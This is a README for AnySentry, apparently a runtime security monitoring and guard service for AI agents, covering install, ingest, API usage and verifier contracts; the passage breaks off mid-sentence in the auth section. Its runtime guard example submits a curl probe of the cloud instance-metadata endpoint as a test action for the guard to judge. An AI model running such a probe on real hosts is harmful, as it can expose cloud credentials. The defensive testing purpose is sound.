# AnySentry

AnySentry is the security observability and intervention plane for AI agents.
It answers one operational question: **what did the agent actually do, was it safe,
and what should an operator or another agent do next?**

The primary path is non-invasive. Agents do not need an SDK, framework adapter, or
code change before they can be monitored. `a3s-observer` captures process, network,
file, DNS, tool, and LLM activity from the node; AnySentry normalizes that activity
into canonical agent events; `@a3s-lab/sentry` judges each event; ClickHouse stores
the evidence; and the API/dashboard turn those judgments into incidents, alerts,
coverage, topology, remediation, evidence bundles, and agent-readable next actions.

Every number on the dashboard is computed from judged runtime events. Synthetic
traffic exists only as an opt-in demo feed.

```
 kernel events (every node)              unmodified agents · any language
   a3s-observer (eBPF) ──NDJSON──▶ forwarder ──POST /security-center/ingest──▶ AnySentry
                                                                  │
                        @a3s-lab/sentry (L1 rules / L2 LLM / L3 agent) judges
                                                                  │
                   ClickHouse (durable store)  ◀──▶  aggregation ──▶ dashboard
```

It ships as a single self-contained service (the API also serves the dashboard) plus ClickHouse
as the durable event store. Drop it in front of any agent fleet — it's a piece of middleware:
events in via `POST /security-center/ingest`, risk out via the dashboard, API, and optional alert webhook.

## Capability map

AnySentry is useful when an AI platform needs more than logs: it needs runtime
evidence, risk judgment, operational state, and safe ways for humans or agents to
intervene. The tables below summarize what is implemented today.

| Use case | Problem it solves | What AnySentry provides |
|---|---|---|
| See what agents really did | Agent tool calls, subprocesses, egress, file access, and LLM calls are hard to reconstruct from app logs alone. | Canonical `anysentry.agent_event.v1` events with agent/session/run/trace identity and redacted evidence. |
| Judge runtime safety | Raw events do not say whether an action is acceptable, suspicious, or severe. | `@a3s-lab/sentry` decisions with verdict, tier, severity, reason, action, and risk category. |
| Preserve audit evidence | Incidents need a case file, not scattered dashboard clicks. | Evidence Bundles and Markdown exports around events, runs, traces, sources, agents, alerts, remediations, objectives, maintenance windows, notifications, topology, and audit records. |
| Find monitoring blind spots | Operators need to know which agents, sources, collectors, or workspaces are not covered. | Coverage issues for stale agents, source gaps, stale tokens, missing collector heartbeats, rejected ingress, and unowned events. |
| Run security operations | Alerts without ownership and next steps create noise. | Incidents, alerts, notification routing, objectives, maintenance windows, remediation tasks, owner/team metadata, and audit trails. |
| Let agents use security controls | Coding agents need a stable way to ask for guard decisions, write evidence, and request next actions. | A discoverable Progressive API at `/security-center/capabilities` plus the `integrations/skills/anysentry-api` Skill. |

| What it observes | Examples | Entry points |
|---|---|---|
| Agent identity and execution context | `agentId`, `sessionId`, `runId`, `traceId`, `spanId`, user, workspace, pod/node context | `a3s-observer`, generic ingest, OTel, Progressive API |
| Tool and subprocess activity | shell commands, argv, cwd, tool name, subprocess chains | observer NDJSON, `recordSecurityEvents`, generic JSON |
| Network and DNS activity | egress peer, port, SNI, endpoint, metadata-service access attempts | observer NDJSON, OTel logs/traces, custom events |
| File and process activity | file paths, read/write-style evidence, process/runtime events | observer NDJSON, custom events |
| LLM activity | model, prompt/completion tokens, latency, `LlmCall` evidence, run/session linkage | `recordSecurityEvents`, a3s-code Skill verifier, custom producers |
| Security-relevant evidence | dangerous commands, privilege escalation signals, suspicious network/file/content events | observer NDJSON, CloudEvents, OTel, generic ingest |
| Sources and collectors | source identity, token state, accepted/rejected counts, heartbeat freshness, collector node/pod | Sources API, heartbeat endpoint, observer forwarder |
| Assets and topology | agents, workspaces, collectors, sources, tool/network/file/LLM dependency edges | derived inventory and `/security-center/agents/topology` |

| What it monitors | Signals and states | Output |
|---|---|---|
| Fleet risk health | block/escalate rates, severity distribution, risk categories, risk trend | health cards, risk summary, explainability wave |
| Decision flow | L1 rules, L2 LLM escalation markers, L3 agent-tier risk, final verdict | decision funnel |
| Agent behavior | throughput, error rate, latency, heartbeat, behavior drift, highest-risk session | live SSE observability and session views |
| Incidents and alerts | risky events, source health, collector health, severe blocks, objective breaches, remediation overdue | incident and alert centers |
| Coverage | stale agents, stale/down sources, source token rotation, missing collector heartbeat, uncovered workspaces | coverage overview and coverage alerts |
| Objectives/SLOs | coverage score, active alerts, open incidents, overdue remediation, risky events, stale agents, collector/source down | objective status, breach alerts, remediation tasks |
| Maintenance | planned windows for global, workspace, agent, collector, or source targets | alert suppression context and maintenance evidence |
| Notification delivery | route matches, webhook delivery status, failures, recovery notifications | notification config, delivery log, audit records |
| Remediation | task owner/status/due time/steps, overdue state, source/alert/objective links | remediation center and AI Operator actions |
| Evidence integrity | timeline, related alerts/incidents/tasks/objectives/coverage/source/collector/audit linkage | Evidence Bundle and Markdown export |

| How it can intervene | What it changes or returns | Interface |
|---|---|---|
| Runtime guard | Returns `allow`, `warn`, `require_approval`, or `block` for a proposed tool/model/output/runtime action. | `security-center.assessRuntimeAction` |
| Schema-aware preflight | Validates an execute request and returns `schemaIssues` without writing events or mutating state. | `dryRun: true` on `/security-center/capabilities` |
| Evidence recording | Writes custom/webhook/OTel-shaped evidence into the same judged event stream as observer events. | `security-center.recordSecurityEvents` |
| Next-action planning | Ranks active remediation, incident, alert, objective, and coverage-derived work for an operator or agent. | `security-center.planNextActions`, `/operator` |
| Case-file assembly | Builds a redaction-safe evidence bundle around an event, run, trace, source, agent, alert, task, objective, or scope. | `security-center.buildEvidenceBundle`, `/evidence` |
| Remediation workflow | Updates task owner, status, notes, due time, and step completion state. | Remediation API and `/operator` |
| Incident and alert lifecycle | Acknowledge, resolve, reopen, and deep-link operational findings. | Incidents and Alerts APIs |
| Source protection | Create sources, enforce ingest tokens, reject invalid producers, and rotate source tokens. | Sources API and ingest headers |
| Governance controls | Save/replay policy, create objectives, define maintenance windows, configure notification routes. | Config, Objectives, Maintenance, Notifications |
| Agent metadata overlay | Attach owner, team, environment, criticality, tags, and notes without changing agent code. | Agent metadata API |

| Boundary | What it means |
|---|---|
| Observe-only by default | `a3s-observer` watches runtime behavior; it does not kill workloads by itself. |
| Enforcement is opt-in | Hard blocking happens when an agent, gateway, or platform loop calls `assessRuntimeAction` and honors `block` / `require_approval`. |
| Synthetic data is explicit | The dashboard is empty until real events arrive unless `ANYSENTRY_SYNTHETIC_FEED` is enabled for demos. |
| No SDK requirement | SDKs and Skills enrich the stream, but the baseline observer path works without agent code changes. |
| Not just a SIEM | AnySentry combines event evidence with guard decisions, source health, coverage, objectives, remediation, evidence handoff, and agent-readable next actions. |

The README is the product entry point, not a second specification. Runtime schemas
come from `describe`, detailed deployment notes live in [`deploy/README.md`](deploy/README.md),
and the canonical agent Skill lives in [`integrations/skills/anysentry-api`](integrations/skills/anysentry-api).

## Operating principles

The platform treats zero-code observation as the product baseline:

- **Observe first.** The recommended collector is `a3s-observer` in observe-only mode; it never
  requires agent code changes and does not block workloads.
- **Normalize after capture.** AnySentry derives a canonical `anysentry.agent_event.v1` envelope
  from raw observer events: `eventId`, `traceId`, `spanId`, `runId`, `agentId`, `sessionId`,
  `eventCategory`, source, risk verdict, attributes, and a redacted raw preview.
- **Redact before persistence.** Observer metadata, generic JSON attributes, CloudEvents
  extensions, OTLP attributes, and raw previews are key-aware redacted for passwords, API keys,
  bearer credentials, tokens, and secrets before they are stored or surfaced in evidence APIs.
- **Optional enrichment only.** SDKs, framework adapters, LLM gateways, or explicit trace IDs can
  enrich the event stream later, but they are not required to monitor arbitrary agents.

## Fast path

Install locally, send one event, then run the core verifier:

```bash
corepack enable
pnpm install

deploy/install.sh docker
curl -fsS http://localhost:29653/security-center/healthz

curl -fsS -X POST http://localhost:29653/security-center/ingest/events \
  -H 'Content-Type: application/json' \
  -d '{
    "sourceType": "custom",
    "sourceName": "readme-smoke",
    "workspacePath": "repo://readme",
    "agentId": "readme-agent",
    "sessionId": "readme-session",
    "events": [
      { "kind": "ToolExec", "command": ["bash", "-lc", "id"], "cwd": "/workspace" }
    ]
  }'

ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:progressive-api
```

Open <http://localhost:29653> for the dashboard. Use `/operator` for ranked
next actions and `/capabilities` for live progressive API discovery.

## Install

Choose Docker for a local workstation or demo, and Kubernetes for a real node/fleet install with
observe-only `a3s-observer` on every node.

Prerequisites:

- Docker + Compose for local mode.
- For Kubernetes mode: `kubectl`, a default StorageClass, and amd64 nodes. The bundled
  `@a3s-lab/sentry` runtime image targets `linux-x64-gnu` on Ubuntu 24.04.
- Optional but recommended for real signals: `a3s-observer-collector` locally, or the bundled
  `deploy/observer.yaml` DaemonSet in Kubernetes.

### Docker local stack

Docker mode builds and starts AnySentry plus ClickHouse. The API also serves the dashboard.

```bash
deploy/install.sh docker
# equivalent: docker compose up -d --build
```

Verify the service and open the dashboard:

```bash
curl -fsS http://localhost:29653/security-center/healthz
# browse http://localhost:29653
```

Useful local operations:

```bash
docker compose ps
docker compose logs -f anysentry
docker compose down                 # stop services, keep ClickHouse volume
docker compose down -v              # stop and remove stored ClickHouse data
```

The dashboard is live but empty until events arrive. To see data immediately, enable demo traffic
and restart:

```bash
# uncomment ANYSENTRY_SYNTHETIC_FEED under the anysentry service in docker-compose.yml, then:
docker compose up -d --build
```

To feed real local activity, pipe an observer collector into the Node forwarder:

```bash
A3S_OBSERVER_JSON=1 sudo -E a3s-observer-collector \
  | ANYSENTRY_INGEST_URL=http://localhost:29653/security-center/ingest node scripts/observer-forward.js
```

### Kubernetes integrated stack

Kubernetes mode creates the namespace, ClickHouse Secret, bundled ClickHouse, AnySentry
Deployment/Service, and the observe-only `a3s-observer` DaemonSet. Choose a real ClickHouse
password before installing:

```bash
ANYSENTRY_INSTALL_MODE=kubernetes \
CLICKHOUSE_PASSWORD="$(openssl rand -hex 16)" \
deploy/install.sh
```

Common install-time options:

```bash
ANYSENTRY_NAMESPACE=security \
ANYSENTRY_OBSERVER_IMAGE=<registry>/anysentry-observer:latest \
ANYSENTRY_APPLY_INGRESS=1 \
ANYSENTRY_INSTALL_MODE=kubernetes \
CLICKHOUSE_PASSWORD="$(openssl rand -hex 16)" \
deploy/install.sh
```

Check rollout and open a local tunnel:

```bash
kubectl -n anysentry rollout status deploy/clickhouse
kubectl -n anysentry rollout status deploy/anysentry
kubectl -n anysentry rollout status daemonset/a3s-observer
kubectl -n anysentry port-forward svc/anysentry 29653:29653
curl -fsS http://localhost:29653/security-center/healthz
```

If your cluster cannot pull the public observer-forwarder image, build and push it, then set
`ANYSENTRY_OBSERVER_IMAGE`:

```bash
docker build -f deploy/observer-forwarder.Dockerfile -t <registry>/anysentry-observer:latest .
docker push <registry>/anysentry-observer:latest
```

To expose the dashboard through an Ingress, edit `deploy/ingress.yaml` for your
`ingressClassName` and host, then either set `ANYSENTRY_APPLY_INGRESS=1` during install or run:

```bash
kubectl -n anysentry apply -f deploy/ingress.yaml
```

### Production notes

- Set `ANYSENTRY_ADMIN_TOKEN` or `ANYSENTRY_MANAGEMENT_TOKEN` to protect control-plane writes.
  Producer paths such as `/security-center/ingest`, Collector heartbeat, and Source check-in stay
  on Source identity and Source ingest tokens.
- Use `ANYSENTRY_SOURCE_ID` and `ANYSENTRY_INGEST_TOKEN` for managed Sources after creating them in
  the dashboard's `/sources` view. The Node and Python forwarders also emit Collector heartbeats
  every `ANYSENTRY_HEARTBEAT_SECS` seconds by default.
- To use an external ClickHouse, remove the bundled ClickHouse objects from
  `deploy/anysentry.yaml` and set `CLICKHOUSE_URL`, `CLICKHOUSE_DB`, `CLICKHOUSE_USER`, and
  `CLICKHOUSE_PASSWORD` on the AnySentry Deployment.
- See [`deploy/README.md`](deploy/README.md) for the longer Kubernetes runbook and manifest
  customization notes.

## Use

AnySentry has three primary usage paths. They all feed the same judged event
stream and all downstream consoles read from that stream.

| Path | Use when | Entry point |
|---|---|---|
| Observer ingest | You want zero-code monitoring for agent workloads on a node or cluster. | `POST /security-center/ingest` with raw `a3s-observer` NDJSON. |
| Generic ingest | You already have webhook, OpenTelemetry, CI, gateway, or agent runtime evidence. | `POST /security-center/ingest/events`, CloudEvents, or OTLP/HTTP JSON. |
| Progressive API | A coding agent or operator needs discoverable guard, evidence, or next-action operations. | `GET|POST /security-center/capabilities`. |

The smallest runtime guard call is:

```bash
curl -fsS -X POST http://localhost:29653/security-center/capabilities \
  -H 'Content-Type: application/json' \
  -d '{
    "action": "execute",
    "module": "security-center",
    "operation": "assessRuntimeAction",
    "params": {
      "autonomy": "guarded",
      "stage": "tool",
      "workspacePath": "repo://payments",
      "agentId": "release-agent",
      "sessionId": "deploy-42",
      "toolName": "bash",
      "command": ["bash", "-lc", "curl http://169.254.169.254/latest/meta-data"]
    }
  }'
```

For agents, the safer flow is always discover-first:

```bash
curl -fsS 'http://localhost:29653/security-center/capabilities?action=list'
curl -fsS 'http://localhost:29653/security-center/capabilities?action=describe&module=security-center&operation=assessRuntimeAction'
```

Then run the same execute body with `dryRun: true` to validate schema and scope
without writing events or changing remediation state. The `/capabilities` page
does this from the dashboard and can generate the canonical `curl` for the
current request.

Operators usually start in the dashboard:

- `/` - fleet risk, incidents, alerts, assets, coverage, topology, and timelines.
- `/operator` - ranked next actions from `planNextActions`, with evidence previews
  and remediation updates.
- `/capabilities` - live progressive API discovery, schema-driven request editing,
  dry-run preflight, execution, and replayable `curl`.
- `/evidence` - case-file assembly and Markdown export for handoff.

## Test

Use the verifier that matches the surface you changed. The local variants build
the API/dashboard, start a temporary AnySentry server on a free port, run the
checks, and stop the server.

| Surface | Command |
|---|---|
| Deployment manifests and installer contracts | `pnpm verify:deployment-manifests` |
| Progressive API static/runtime contract | `pnpm verify:progressive-api` |
| Progressive API with temporary local API | `pnpm verify:progressive-api:local` |
| Dashboard serving, assets, deep links, Operator, Capabilities | `pnpm verify:dashboard-runtime:base-path:local` |
| Observer NDJSON ingest | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:observer-ingest` |
| Node/Python forwarders | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:forwarders` |
| Generic JSON, CloudEvents, and OTLP ingest | `pnpm verify:ingest-protocols:local` |
| Management auth | `pnpm verify:management-auth:local` |
| Operations lifecycle | `pnpm verify:operations-lifecycle:local` |
| Coverage, objectives, maintenance, remediation, evidence, notifications | `pnpm verify:contracts:local` |
| a3s-code verifier summary contract, without API/model calls | `pnpm verify:a3s-code-skill-api:self-test` |
| Real a3s-code Skill plus LLM-backed evidence event | `ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center A3S_TEST_MODEL=openai/glm5.1-w4a8 A3S_CODE_ACL="$HOME/.a3s/config.acl" A3S_CODE_SDK_BASE=../os/apps/api pnpm verify:a3s-code-skill-api` |

For production smoke or soak testing, run the verifier on the target Shu'an OS
production host or a production-equivalent node, not against a local
Docker/OrbStack instance, and do not reuse old event IDs as proof. Run new
agents with unique `agentId` / `runId` values, make real `session.send()` calls
through a configured model, write `LlmCall` evidence through
`security-center.recordSecurityEvents`, then query the new rows back through
`/security-center/events/list` and build an Evidence Bundle for at least one new
event. That is the same path the a3s-code verifier uses.
The a3s-code verifier also wraps Skill calls with `A3S_CODE_SKILL_TIMEOUT_MS`;
timeouts, max-tool-round failures, and invalid Skill results are recorded as
`SecurityFinding` events through `recordSecurityEvents`, so failed soak attempts
remain queryable and bundleable; the verifier now queries the failure event back
and builds an Evidence Bundle before reporting the failure. Both success and
failure evidence include verifier audit metadata such as the git commit, timeout
configuration, model, verifier schema version, and phase timing diagnostics.
Successful runs that spend more than `A3S_CODE_NEAR_TIMEOUT_RATIO` (default
`0.5`) of the configured timeout in the a3s-code Skill call also record an
allow-level `RuntimeEvent` with `progressive.warning=near_timeout`, so soak runs
can spot latency drift before it becomes a hard timeout without polluting LLM
call metrics. The verifier queries those warning rows back and fails if any
near-timeout warning is stored as `LlmCall` or categorized as `llm`; triggered
warning summaries also require exactly one runtime warning row for the run.
Set `A3S_CODE_REQUIRE_NEAR_TIMEOUT_WARNING=1` with a deliberately low
`A3S_CODE_NEAR_TIMEOUT_RATIO` for production smoke tests that must exercise the
warning branch; if the warning is not emitted, the verifier records a
`SecurityFinding` failure before exiting non-zero. Passed and failed verifier
runs emit a single-line `VERIFIER_SUMMARY` JSON record with schema
`anysentry.a3s_code_skill_verifier.summary.v1`, so production automation can
assert `status`, failure phase, failure evidence, event IDs, warning isolation,
warning event/bundle bindings, and timing fields without scraping human-readable
log lines. Summary validation binds `verifier.commit`, `verifier.schemaVersion`,
`verifier.model`, timeout settings, near-timeout warning settings, Node.js
runtime version, and the target `apiBase`/`runId`/`agentId`/`sessionId` to the
running verifier process, so automation can reject stale, cross-run, or
cross-config summaries. Stored event, warning, and failure audit attributes use
`progressive.verifier.closeTimeoutMs` for the same session-close timeout value,
so the audit key stays separate from platform session identity fields. The
warning budget fields also bind to the running
verifier config: `warning.required` must match
`A3S_CODE_REQUIRE_NEAR_TIMEOUT_WARNING`, and `warning.thresholdMs` must match the
computed timeout threshold. Triggered warnings must also bind to the timing
budget by proving `timings.skill >= warning.thresholdMs` and to the canonical
`warning.reason`; passed summaries with untriggered warnings must prove
`timings.skill < warning.thresholdMs`.
Passed summaries must identify
`verifier.skill=anysentry-api`, report a positive `verifier.toolCalls`, and
include the warning budget state; when
`warning.required=true`, `warning.triggered` must also be true. Warning summaries
are mutually exclusive: triggered warnings carry warning event kind, category,
verdict, reason, bundle, and isolation evidence and no failure payload, while
untriggered warnings carry no stale warning event, reason, or isolation fields.
Triggered warnings must be separate `RuntimeEvent`/`runtime`/`allow` rows, not
the success `LlmCall` row, so summary-only automation can verify that latency
warnings did not pollute LLM evidence. Triggered warning summaries also bind the
warning row's `workspacePath`, `runId`, `agentId`, and `sessionId` to the target
identity, expose `warning.persistedVerifierAttributes` and
`warning.persistedTimingAttributes` from the warning row's stored audit
metadata, and expose `warning.sourceEventId`, which must match the success
evidence event. The warning reason binds to the same canonical
`progressive.warning.reason` value recorded on the runtime warning row. The
warning bundle fields bind to the same Evidence Bundle as the success evidence:
`warning.bundleSchemaVersion` must be
`anysentry.evidence_bundle.v1`, `warning.bundleContainsSourceEvent` must be
true, `warning.bundleEventCount` must match the success bundle summary count,
and `warning.bundleListedEventCount` must match the success bundle's listed
event count. `warning.bundlePrimaryEventId` must match the success evidence
event, proving the shared bundle's primary event is the warning source event.
Success summaries also include the inner Skill output health/list/describe
proofs, event, workspace, run, agent, session, bundle IDs, and inner API timing
fields under `evidence.skillOutput`, and the verifier fails if those proofs do
not show `healthOk=true`, `listed=true`, and `described=recordSecurityEvents` or
if the IDs do not match the target identity, rows, Evidence Bundle, or timing
contract queried by the outer runtime. The summary also exposes
`evidence.persistedVerifierAttributes`, `evidence.persistedSkillAttributes`, and
`evidence.persistedPreflightAttributes` from the stored success row, where the
first must match the running verifier audit metadata, the Skill attributes must
match the stored `progressive.runner`, `progressive.skill`, `progressive.flow`,
and `progressive.model` markers, and the preflight attributes persist the same
preflight proof attributes
(`progressive.verifier.healthOk`, `progressive.verifier.listed`, and
`progressive.verifier.describedOperation`), and the outer verifier rejects rows
whose attributes drift from the Skill output. It also exposes
`evidence.persistedInnerTimingAttributes` for the stored pre-record timing
attributes, and those values must match `evidence.skillOutput.timings`. The
stored success evidence row also exposes `evidence.workspacePath`,
`evidence.runId`, `evidence.agentId`, and `evidence.sessionId`, which must match
the target identity. Passed summary validation also
requires both the stored event and the Skill output to remain
`LlmCall`/`llm`/`allow`, with matching event categories and
`evidence.skillOutput.queriedBack=true`, so automation can detect
evidence-contract drift from the summary alone. The outer and Skill-reported
Evidence Bundle schema, event-membership flag, and `bundleEventCount` fields
must also be valid and equal. The contract also exposes
`bundleListedEventCount` from `events.length` on the Evidence Bundle response;
it must be positive, must not exceed `bundleEventCount`, and must match the
Skill-reported listed count. This lets automation distinguish bundle summary
count drift from listed-member drift without rebuilding the bundle. The
contract also exposes `bundlePrimaryEventId`, which must match the stored event
ID in both the outer evidence and the Skill output, so summary-only automation
can detect bundles whose primary event drifted even when the event is still
listed.
Failed summaries always include explicit `failure.details` plus a failure
evidence status, either with the recorded event/bundle IDs or with
`recorded=false` plus the reason evidence was not written; these states are
mutually exclusive, so recorded evidence must not carry `error` and unrecorded
evidence must not carry stale event, bundle, or persisted-attribute fields. If a
failed summary also includes top-level success `evidence`, that evidence must
satisfy the same stored-event and Skill-output contract as a passed summary and
must not reuse the recorded failure evidence event or bundle IDs.
Recorded failure
evidence must be the canonical
`SecurityAction`/`security` event produced from the verifier's `SecurityFinding`,
must carry a non-allow verdict, must use `riskCategory=runtime_failure`, and
must bind `failurePhase`, `failureReason`, persisted-attribute
`failureDetails`, `failure.evidence.persistedVerifierAttributes`, and
`failure.evidence.persistedTimingAttributes` to the top-level failure, timings,
and running verifier metadata plus `workspacePath`, `runId`, `agentId`, and
`sessionId` to the target identity.
Recorded failure bundles must use schema `anysentry.evidence_bundle.v1`, must
include the failure event, and must report positive Evidence Bundle summary and
listed event counts, with the listed count not exceeding the summary count. They
must also expose `bundlePrimaryEventId` matching the recorded failure event.
When a required near-timeout warning is missing, the nested
`warning.failure.evidence` must match the top-level `failure.evidence`,
including persisted verifier and timing attribute evidence, so automation does
not need to guess which failure record is authoritative. Other failed summaries
must not carry stale `warning` payloads. Timing values in
summaries must be non-negative
numbers or non-empty strings, and failed summaries outside preflight and
summary-validation must bind `timings.failurePhase` to `failure.phase`, while
preflight and summary-validation failures must not carry stale
`timings.failurePhase`. If the
verifier detects that its own summary violates the contract, the emitted summary
is converted to `status=failed` with `failure.phase=summary_validation` so
automation can trust the top-level status. Summary-validation failures must also
carry `summaryValidation.status=failed` and a non-empty
`summaryValidation.issues` array that exactly matches `failure.details.issues`;
passed summaries and non-summary-validation failures must not carry stale
`summaryValidation` payloads. Summary-validation failures are rebound to the
running verifier commit, model, API base, run ID, agent ID, and session ID; stale
or mismatched original identities are retained only under
`failure.details.originalVerifier` and `failure.details.originalTarget`.
Runtime contract failures after the Skill runs, such as missing event markers or
Evidence Bundle drift, are recorded as phase-specific `SecurityFinding` evidence
instead of being collapsed into generic summary-validation failures.
Pre-session failures are also phase-specific: `healthz` failures report
`recorded=false` because the API is unavailable, while SDK load and Agent
creation failures attempt to write the same failure evidence through AnySentry.
`pnpm verify:a3s-code-skill-api:self-test` validates that summary
contract and the Skill-output final-line JSON parser offline, so the production
verifier's machine-readable handoff is checked without adding a parallel soak
path.
The Skill invocation runs the checked-in `scripts/verify-a3s-code-skill-inner.mjs`
helper with a typed identity JSON environment, so `runId`, `agentId`,
`sessionId`, and `workspacePath` are not reconstructed by the model from a long
inline script.
Timeout handling closes the a3s-code session before writing failure evidence, and
`A3S_CODE_SESSION_CLOSE_TIMEOUT_MS` bounds that cleanup so a stuck close cannot
suppress the failure finding. Coding-agent producer aliases such as
`NetworkEgress`, `FileRead`, `FileWrite`, and `SecurityFinding` are normalized to
the canonical AnySentry kinds `Egress`, `FileAccess`, and `SecurityAction`.
Producer-reported `SecurityFinding` and `progressive.failure=true` events are
stored as non-allow findings, so failed soak attempts show up in risk and action
flows instead of looking like benign telemetry.
When runtime guard fallback logic upgrades an otherwise-benign tool decision, it
also records an actionable `SecurityFinding` that links back to the original
action event, so the block/approval decision and the evidence stream stay aligned.
`pnpm verify:progressive-api:local` and the production progressive verifier both
regression-check that alias normalization and obvious high-risk runtime guard
actions return a non-allow policy decision. Keep production probes on this single
progressive API path rather than adding a parallel soak evidence format.

To regression-check the primary observer path against a running API, including raw observer NDJSON,
Source token rejection, evidence redaction, raw `CollectorHeartbeat`, direct forwarder heartbeat,
Collector health, and Source rollups:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:observer-ingest
```

To regression-check the bundled Node and Python forwarders themselves against a running API,
including Source-token headers, final heartbeat flush, pseudo-filesystem noise filtering, forwarded
Events, Collector health, and Source rollups:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:forwarders
```

To regression-check the built dashboard served by the API, including SPA fallback for every
management route, hashed JS/CSS asset delivery, live observability SSE, and `/security-center/*`
API routes staying JSON:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:dashboard-runtime
```

To regression-check the same single-service dashboard under an ingress-style sub-path, including
prefixed static assets and prefixed `/security-center` API calls:

```bash
pnpm verify:dashboard-runtime:base-path:local
```

To regression-check the Kubernetes and Docker deployment contracts, including service ports,
health probes, ClickHouse wiring, observe-only observer forwarding, Ingress routing, and runtime
image assumptions plus the integrated installer:

```bash
pnpm verify:deployment-manifests
```

To regression-check the source-compatible progressive capability API contract, including
`list/search/describe/execute`, module/operation dispatch, shaped responses, and the runtime guard
operation. The local variant also runs a real guard -> next action -> progressive evidence bundle
-> Remediation status update loop:

```bash
pnpm verify:progressive-api
pnpm verify:progressive-api:local
```

To run the real a3s-code Skill integration check, using `glm5.1-w4a8`, load
`integrations/skills/anysentry-api`, invoke it through the a3s-code `Skill` tool, and have that
Skill call the progressive API flow
(`healthz -> list -> describe -> execute -> events/list -> buildEvidenceBundle`):

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center \
A3S_TEST_MODEL=openai/glm5.1-w4a8 \
A3S_CODE_ACL="$HOME/.a3s/config.acl" \
A3S_CODE_SDK_BASE=../os/apps/api \
pnpm verify:a3s-code-skill-api
```

The verifier creates one unique `LlmCall`/`llm` evidence event through
`security-center.recordSecurityEvents`, then queries it back by `runId` and checks the stored
attributes bind `progressive.runner=a3s-code`, `progressive.skill=anysentry-api`, the expected
`progressive.flow`, and the verifier model. It then builds an Evidence Bundle for the same event
and asserts that the bundle contains the new evidence.

To regression-check optional management API auth, including admin-token protection for control-plane
mutations while leaving read APIs, `/ingest`, Collector heartbeat, and Source check-in on their
producer-token paths:

```bash
pnpm verify:management-auth:local
```

To regression-check Coverage runtime evaluation against a running API, including Source coverage
gaps, Source token rotation due issues, Coverage alert lifecycle, Maintenance suppression markers,
and coverage score recovery for suppressed or freshly rotated issues:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:coverage-runtime
```

To regression-check the management lifecycle against a running API, including Source token
rotation, Incident / Alert / Remediation updates, Agent metadata, Maintenance windows,
Notifications, Objectives, Policy simulate/update, and Audit records with actor attribution:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:operations-lifecycle
```

To regression-check Objective runtime evaluation against a running API, including Source-down,
active-Alert, open-Incident, and overdue-Remediation objectives moving between `ok` and `breach`
as live signals change, Objective breach alert generation, governance alert exclusion from
`active_alerts`, and Remediation task creation from Objective alerts:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:objectives-runtime
```

To regression-check Maintenance runtime suppression against a running API, including active
maintenance resolving Source alerts, Objective recovery during maintenance, and alert re-opening
after the maintenance window is disabled:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:maintenance-runtime
```

To regression-check Remediation runtime generation against a running API, including runbook tasks
derived from live Incident and Coverage evidence, Maintenance-suppressed Coverage gaps staying
quiet, overdue Remediation alerting from manual updates and the background due-date scanner without
recursive task creation, and manual Remediation status / owner / step state surviving regeneration:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:remediation-runtime
```

To regression-check Evidence Bundle case-file assembly and Markdown handoff export against a running
API, including Event, Incident, Alert, Remediation, Objective, Notification delivery, Maintenance
window, Topology, Agent, Workspace, Source, Collector, and Audit linkage:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:evidence-bundle
```

To regression-check alert notification dispatch against a running API, including route filtering,
owner/team routing, Collector health routing, critical block event routing, Objective breach routing,
Coverage issue routing, Remediation overdue routing, webhook payload shape, delivery history,
delivery correlation IDs including Coverage `issueId`, Source / Objective / Coverage / Remediation recovery delivery, manual
Alert / Incident lifecycle delivery, delivery failure audit, delivery status, and token /
webhook-secret non-leakage:

```bash
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm verify:notification-dispatch
```

To performance-test AnySentry and its runtime dependency chain, including dashboard serving,
progressive API dispatch, raw observer NDJSON ingest, `@a3s-lab/sentry` judging, generic ingest,
ClickHouse-backed write/read paths, dashboard aggregate queries, and Evidence Bundle assembly:

```bash
pnpm perf:anysentry
ANYSENTRY_API_BASE=http://127.0.0.1:29653/security-center pnpm perf:anysentry
```

See [`docs/performance-testing.md`](docs/performance-testing.md) for local, deployed, Kubernetes,
smoke, and stress profiles plus report interpretation.

Recent deployed baseline with the default profile, ClickHouse enabled, and Kubernetes pod snapshots
showed 0 request errors across the dependency chain:

| Scenario | Throughput | p95 latency |
|---|---:|---:|
| `progressive.recordSecurityEvents` | 72.93 events/s | 101.01 ms |
| `ingest.observer.ndjson` | 91.25 events/s | 98.96 ms |
| `ingest.events.batch` | 216.83 events/s | 118.51 ms |
| `events.list` | 18.69 req/s | 528.36 ms |
| `aggregate.dashboard` | 12.70 req/s | 714.49 ms |
| `evidence.bundle` | 0.30 req/s | 13266.75 ms |

`evidence.bundle` is the current slow path to watch in future baselines; the write paths stayed
under 120 ms p95 in this run.

For a one-command local run that builds the API and dashboard, starts a temporary server, runs the
deployment manifest, management-auth, normal and ingress sub-path dashboard, observer, forwarder,
heterogeneous ingress, Coverage runtime, operations lifecycle, Objective runtime, Maintenance
runtime, Remediation runtime, Evidence Bundle/export, notification dispatch, and deep-link contract
verifiers, then stops the server:

```bash
pnpm verify:contracts:local
```

Configuration is via environment variables — see [`.env.example`](.env.example).

## Management auth

Set `ANYSENTRY_ADMIN_TOKEN` (or `ANYSENTRY_MANAGEMENT_TOKEN`) to require an operator token for
control-plane mutations: policy saves/simulations, Source create/update/rotate, Incident/Alert/
Remediation edits, Agent metadata, Maintenance windows, Notification channels/routes, and
Objectives. The token can be sent as `X-AnySentry-Admin-Token`,
`X-AnySentry-Management-Token`, or `Authorization: Bearer <token>`.

Read APIs and producer paths stay separate: `/security-center/ingest`, generic/OTLP ingest,
